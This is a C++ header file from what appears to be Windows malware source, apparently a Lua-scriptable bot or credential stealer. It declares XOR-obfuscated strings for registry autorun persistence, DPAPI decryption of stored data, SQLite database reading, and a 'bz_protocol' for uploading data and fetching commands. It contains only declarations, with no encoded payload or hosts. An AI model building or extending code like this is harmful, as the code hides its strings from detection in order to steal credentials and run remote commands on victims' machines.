//Auto generated @17/08/2017 19:22

#pragma once

#define CSTRW(var, id) WCHAR var[CryptedStrings::len_##id]; CryptedStrings::_getW(CryptedStrings::id_##id, var);
#define CSTRA(var, id) char var[CryptedStrings::len_##id]; CryptedStrings::_getA(CryptedStrings::id_##id, var);

namespace CryptedStrings
{
	typedef struct
	{
		unsigned char key;   //Clef de décodage XOR sur un byte
		unsigned short size; //Taille du string
		char *encodedString; //String encodé
	}crypted_string_t;

	//Liste des id de string
	enum
	{
		id_windows_shellexec_open,
		id_regpath_autorun,
		id_regkey_autorun,
		id_path_core,
		id_path_update,
		id_path_infodatabase,
		id_bot_param_update,
		id_lua_error_bad_signature,
		id_lua_error_system,
		id_lua_lib_windows,
		id_lua_lib_windows_messagebox,
		id_lua_lib_windows_getfolder,
		id_lua_lib_windows_cryptunprotecthexdata,
		id_lua_lib_sqlite3,
		id_lua_lib_sqlite3_open,
		id_lua_lib_sqlite3_gettable,
		id_lua_lib_sqlite3_close,
		id_lua_lib_database,
		id_lua_lib_database_add,
		id_lua_lib_bzp,
		id_lua_lib_bzp_validate,
		id_http_test_url,
		id_protocol_http,
		id_protocol_https,
		id_http_header_separator,
		id_http_header_content_type_post,
		id_http_user_agent,
		id_http_method_post,
		id_http_method_get,
		id_http_version,
		id_http_separator,
		id_http_param_begin,
		id_http_param_separator,
		id_http_param_equal,
		id_bz_protocol_validate,
		id_bz_protocol_upload,
		id_bz_protocol_get_cmds,
		id_bz_protocol_param_id,
		id_bz_protocol_param_data_type,
		id_bz_protocol_param_data,
		id_bz_protocol_data_public_key,
		id_bz_protocol_validate_public_key
	};

	//List des tailles de string
	enum
	{
		len_windows_shellexec_open = 4 + 1,
		len_regpath_autorun = 45 + 1,
		len_regkey_autorun = 10 + 1,
		len_path_core = 21 + 1,
		len_path_update = 26 + 1,
		len_path_infodatabase = 31 + 1,
		len_bot_param_update = 4 + 1,
		len_lua_error_bad_signature = 13 + 1,
		len_lua_error_system = 12 + 1,
		len_lua_lib_windows = 7 + 1,
		len_lua_lib_windows_messagebox = 10 + 1,
		len_lua_lib_windows_getfolder = 9 + 1,
		len_lua_lib_windows_cryptunprotecthexdata = 21 + 1,
		len_lua_lib_sqlite3 = 7 + 1,
		len_lua_lib_sqlite3_open = 4 + 1,
		len_lua_lib_sqlite3_gettable = 8 + 1,
		len_lua_lib_sqlite3_close = 5 + 1,
		len_lua_lib_database = 8 + 1,
		len_lua_lib_database_add = 3 + 1,
		len_lua_lib_bzp = 3 + 1,
		len_lua_lib_bzp_validate = 8 + 1,
		len_http_test_url = 14 + 1,
		len_protocol_http = 7 + 1,
		len_protocol_https = 8 + 1,
		len_http_header_separator = 2 + 1,
		len_http_header_content_type_post = 47 + 1,
		len_http_user_agent = 113 + 1,
		len_http_method_post = 4 + 1,
		len_http_method_get = 3 + 1,
		len_http_version = 8 + 1,
		len_http_separator = 1 + 1,
		len_http_param_begin = 1 + 1,
		len_http_param_separator = 1 + 1,
		len_http_param_equal = 1 + 1,
		len_bz_protocol_validate = 14 + 1,
		len_bz_protocol_upload = 17 + 1,
		len_bz_protocol_get_cmds = 19 + 1,
		len_bz_protocol_param_id = 2 + 1,
		len_bz_protocol_param_data_type = 6 + 1,
		len_bz_protocol_param_data = 10 + 1,
		len_bz_protocol_data_public_key = 271 + 1,
		len_bz_protocol_validate_public_key = 271 + 1
	};

	void _getA(WORD id, LPSTR buffer);
	void _getW(WORD id, LPWSTR buffer);
}